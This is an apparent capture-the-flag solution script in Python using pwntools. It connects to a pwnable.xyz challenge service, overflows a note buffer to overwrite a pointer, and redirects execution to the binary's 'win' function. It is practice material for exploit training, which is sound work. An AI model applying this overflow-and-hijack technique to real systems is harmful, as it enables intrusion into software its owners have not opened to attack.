#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = "b*edit_desc")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("svc.pwnable.xyz" ,30016)

con.sendlineafter(b"> ", b"1")
con.sendlineafter(b"len? ", b"41")
con.sendlineafter(b"note: ", b"A"*32 + p64(0x601220))

con.sendlineafter(b"> ", b"2")
con.sendlineafter(b"desc: ", p64(elf.sym['win']))

con.sendlineafter(b"> ", b"4")

con.interactive()
